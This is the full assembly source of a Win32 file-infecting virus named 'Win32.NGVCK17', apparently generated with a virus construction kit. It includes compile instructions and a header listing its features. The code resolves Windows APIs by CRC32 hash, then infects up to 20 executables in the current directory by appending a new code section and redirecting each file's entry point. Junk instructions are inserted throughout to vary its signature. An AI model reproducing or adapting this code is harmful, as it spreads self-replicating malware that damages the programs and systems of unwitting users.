              
;
;
; Win32.NGVCK17 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK17
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 14
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 35675 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 dec esp
 add esp, 5d
 mov edx, dword ptr [esp-4]
 add ecx, 69860090d                     ; Trash
                                        ; mov ebp, edx
                                        ; clear ebp
 mov ebp, -65680d
 add ebp, 65680d
 add ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop esi

 mov dword ptr [ebp+retBase], esi

                                        ; clear ecx
 mov ecx, -5989d
 add ecx, 5989d
 xor ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ecx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov edi, 20
 mov edi, 0
 add edi, 20d
 mov dword ptr [ebp+InfCounter], edi
 mov esi, ebp
 add esi, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
 shr ecx, 27d                           ; Trash
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
 xor eax, 36357422d                     ; Trash
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov ebx, 82765003d                     ; Trash
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 sub ebx, 35203885d                     ; Trash
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;                  [ ///// * Data * \\\\\ ]

Data:
 NewEIP      dd 0h
 KernelPE    dd 0h
 NTableVA    dd 0h
 PEheader    dd 0h
 FileHandle  dd 0h
 TempAPI     dd 0h
 FindHandle  dd 0h
 Misc1       dd 0h
 filealign   dd 0h
 AlignReg2   dd 0h
 AlignTemp   dd 0h

 APIOffsets:
 XLoadLibraryA          dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XGetProcAddress        dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h

 CheckSumMFA db 'CheckSumMappedFile',0
 NewSize     dd 0h
 sectionalign   dd 0h
 Imagehlp    db 'imagehlp.dll',0
 filemask    db '*.exE',0
 AlignReg1   dd 0h
 OldEIP      dd 0h
 OldBase     dd 400000h
 Trash1      dd 0h

 TempApisearch2 dd 0h
 InfCounter  dd 0h
 MapAddress  dd 0h
 db 'Virus : Win32.NGVCK17 Author : SnakeByte',0
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APINames:
 dd 04134D1ADh           ; LoadLibraryA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0C200BE21h           ; FindClose
 dd 094524B42h           ; UnmapViewOfFile
 dd 0FFC97C1Fh           ; GetProcAddress
 dd 068624A9Dh           ; CloseHandle
 dd 0AA700106h           ; FindNextFileA
 dd 08C892DDFh           ; CreateFileA
 dd 0797B49ECh           ; MapViewOfFile

 MapHandle   dd 0h
 ATableVA    dd 0h
 CheckSum dd 0h
 KernelMZ    dd 0h
 HeaderSum dd 0h
 OTableVA    dd 0h
 XCheckSumMappedFile    dd 0h
 counter     dw 0h
 APICRC32    dd 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
 add ecx, 97134620d                     ; Trash
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 push esi
                                        ; round to pages
 shr esi, 16d
 shl esi, 16d
                                        ; add esi, 1
 sub esi, -1d
GetKernelLoop:
                                        ; clear eax
 and eax, 0
 sub esi, 1
 mov ax, word ptr [esi+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp esi, dword ptr [esi+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], esi
                                        ; add esi, 60
 add esi, 60d
 mov ecx, [esi]
 inc esi
 sub esi, 61d
 add ecx, esi
 mov [KernelPE+ebp], ecx

 lea eax, GetApis
 add eax, ebp

 push eax
ret


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edi, offset WIN32_FIND_DATA
 add edi, ebp

 push edi
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, edx

                                        ; mov ecx, 276
 mov ecx, ( 276d + 23d )
 sub ecx, 23d

ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 add ebx, edx                           ; Trash
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ebx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push edi
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
 pop ecx 
                                        ; mov edi, eax
 mov edi, eax
GetOtherApiLoop:
 push ecx 
 push edx 
 push ebx
 push edi
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [edx], eax
                                        ; add edx, 4
 add edx, 4d
 sub ecx, 1
 sub ecx, 1
 add ecx, 1
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add ebx, 1
 inc ebx
 cmp byte ptr [ebx], 0
 jne GetOtherApiLoop2
                                        ; add ebx, 1
 sub ebx, -1d
 jmp GetOtherApiLoop
 sal eax, 15d                           ; Trash
GetOtherApiEnd:
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, eax
 xor dword ptr [ebp+Trash1], ecx        ; Trash
 add esi, [eax+3Ch]
                                        ; get File Alignment
 mov ecx, [esi+3Ch]
 mov dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ecx
                                        ; get old Entrypoint
 mov ebx, dword ptr [ecx+28h]
 push ebx
 pop dword ptr [ebp+OldEIP]
 mov ebx, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ebx, [ecx+38h]
 mov dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov eax, [ecx+74h]
 shl eax, 3
                                        ; clear ebx
 mov ebx, -15313d
 add ebx, 15313d
 mov bx, word ptr [ecx+6h]
 mov edx, 28h
 pushad
 mov eax, ebx
 mul edx
 mov dword ptr [ebp+Misc1], eax
 popad
 mov ebx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, eax
 add ecx, ebx
 lea edx, [ebp+newsection]
 xchg eax, edx


 xchg eax, ecx
 push eax
                                        ; Calculate the RVA of the new section
 mov ecx, [eax-5*8+8d]
 add ecx, [eax-5*8+12d]
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ecx
 push edx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov ebx,[eax-5*8+20d]
 add ebx,[eax-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+filealign]
 mov ebx, ecx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 neg ecx                                ; Trash
 pop eax
 lea edx, [ebp+newsection]
 xchg edx, edi

                                        ; mov ebx, 64
 mov ebx, ( 64d - 1d )
 add ebx, 1d
WriteNewSectionLoop:
 and edx, 12317368d                     ; Trash
 mov cl, byte ptr [edi]
 mov byte ptr [eax], cl
                                        ; add edi, 1
 inc edi
                                        ; add eax, 1
 inc eax
 add ebx, -1
 cmp ebx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+PEheader]
 sub word ptr [ebx+06h], -1
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], edx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 'NGVC'
 mov ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 lea ecx, [ebp+Virus]
 xchg ecx, esi

 mov edx, VirusSize
 or ecx, 94111040d                      ; Trash
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 lea ebx, [ebp+CheckSum]
 xchg ebx, ecx

 push ecx
 mov eax, ebp
 xor ebx, eax                           ; Trash
 add eax, offset HeaderSum

 push eax
 push dword ptr [ebp+NewSize]
 pop ecx
 push ecx
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
 mov ecx, dword ptr [ebp+MapAddress]
 mov ecx, [ecx+3Ch]
 add ecx, dword ptr [ebp+MapAddress]
 mov ebx, dword ptr [ebp+CheckSum]
 mov dword ptr [ecx+58h], ebx
NoCheckSum:
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop edx
 rcl ecx, 30d                           ; Trash
 sub edx, 1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [ecx+3Ch]
 or ebx, ebx
 jz Notagoodfile
                                        ; clear eax
 mov eax, 21293d
 sub eax, 21293d
 add eax, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [eax+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [eax+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad

                                        ; clear edx
 and edx, 0
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [edx+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 add edi, 28d
                                        ; get ATableVA
 mov edx, dword ptr [edi]
                                        ; add edi, 4
 dec edi
 add edi, 5d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [edi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; add edi, 4
 inc edi
 add edi, 3d
                                        ; get OTableVA
 mov edx, dword ptr [edi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx


                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
                                        ; mov edx, eax
 mov edx, eax
                                        ; mov edi, eax
                                        ; clear edi
 and edi, 0
 add edi, eax
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ebx, dword ptr [ebp+APICRC32]
 sub ebx, dword ptr [esi]
 add ebx, -1
 inc ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 rcl ecx, 16d                           ; Trash
 pop edx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 not eax                                ; Trash
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop eax
                                        ; clear ecx
 mov ecx, -15828d
 add ecx, 15828d
 mov cx, word ptr [eax]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ecx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ebx, edi
 push edi
 pop ebx
LenCRC:
                                        ; add ebx, 1
 sub ebx, -1d
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, edi
                                        ; mov esi, ebx
 mov esi, ebx
                                        ; add esi, 1
 sub esi, -1d
 cld
                                        ; clear edx
 xor edx, edx
 add edx, -1
                                        ; mov ecx, edx
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, edx
NextByteCRC:
                                        ; clear ebx
 mov ebx, -2728d
 add ebx, 2728d
                                        ; clear eax
 push 0
 pop eax
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 xor bl, dl
 mov dl, dh
 mov dh, cl
 mov cl, ch
 mov ch, 8
NextBitCRC:
 shr ax, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor ax,0EDB8h
NoCRC:
 dec ch
jnz NextBitCRC
 xor edx, ebx
 xor ecx, eax
 dec esi
jnz NextByteCRC
 not ecx
 not edx
 mov ebx, ecx
 rol ebx, 16d
 mov bx, dx
 mov dword ptr [ebp+APICRC32], -1
 and dword ptr [ebp+APICRC32], ebx
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ebx
 mov ebx, -5475d
 add ebx, 5475d
 add ebx, NumberOfApis

                                        ; load API Names and Offsets
 mov esi, ebp
 add esi, offset APINames

 lea ecx, [ebp+APIOffsets]


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ecx points to the offset

 call SearchAPI1
                                        ; add esi, 4
 dec esi
 add esi, 5d
                                        ; clear edx
 mov edx, -35049d
 add edx, 35049d
 xor edx, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], -1
 and dword ptr [ecx], edx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 sub ebx, 1
 jnz GetApisLoop
 lea eax, [ebp+Imagehlp]
 xchg edi, eax

 mov ebx, ebp
 add ebx, offset CheckSumMFA

                                        ; mov ecx, 1
 mov ecx, 1d
 mov edx, ebp
 add edx, offset XCheckSumMappedFile

 call GetOtherApis
 jmp Outbreak



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop esi

 add ebx, ecx                           ; Trash
 mov dword ptr [ebp+retBase], esi

 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 sub ebp, 1
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 push edx
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

 add edx, eax                           ; Trash
                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 mov esi, offset WFD_szFileName
 add esi, ebp

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ecx
 xor ecx, ecx
 push ecx
 push edx
 push ecx
 and ebx, 84710705d                     ; Trash
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 not ecx                                ; Trash
 pop edx
 sar ebx, 11d                           ; Trash
 sub eax, 1
 add eax, 1
 jz CloseFile
                                        ; clear ecx
 xor ecx, ecx
 push edx
 push ecx
 mov ebx, ebx                           ; Trash
 push ecx
 or eax, 54247010d                      ; Trash
                                        ; mov ebx, 2
 mov ebx, ( 2d - 10d )
 add ebx, 10d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 xor ecx, 76043493d                     ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
 add ecx, 27185492d                     ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 mov edx, 26074d
 sub edx, 26074d
 push edx
 call ExitProcess



end FakeCode

